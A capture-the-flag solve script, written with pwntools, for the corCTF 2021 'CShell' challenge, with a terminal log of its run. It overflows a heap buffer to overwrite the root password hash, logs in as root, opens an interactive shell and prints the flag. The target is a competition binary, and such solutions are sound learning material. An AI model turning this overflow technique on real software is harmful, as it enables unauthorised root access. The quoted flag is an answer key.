from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './Cshell'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "pwn.be.ax"
  PORT = 5001
  s = remote(HOST, PORT)
else:
  s = process(BINARY)

s.sendlineafter("> ", "test")
s.sendlineafter("> ", "1234")

s.sendlineafter("> ", "128")

buf  = "a"*(200-13)
buf += "13xNMBCmlmL2Q"  # hash value of "1234"
s.sendlineafter("> ", buf)

s.sendlineafter("Choice > ", "1")
s.sendlineafter("Username:", "root")
s.sendlineafter("Password:", "1234")

s.sendlineafter("Choice > ", "3")

s.interactive()

'''
mito@ubuntu:~/CTF/corCTF_2021/Pwn_CShell$ python solve.py r
[*] '/home/mito/CTF/corCTF_2021/Pwn_CShell/Cshell'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to pwn.be.ax on port 5001: Done
[*] Switching to interactive mode
$ id
uid=1000 gid=1000 groups=1000
$ ls -l
total 1172
-rw-rw-r-- 1 nobody nogroup      47 Aug 14 18:21 flag.txt
-rwxrwxr-x 1 nobody nogroup 1192888 Aug 17 22:52 run
$ cat flag.txt
corctf{tc4ch3_r3u5e_p1u5_0v3rfl0w_equ4l5_r007}
'''

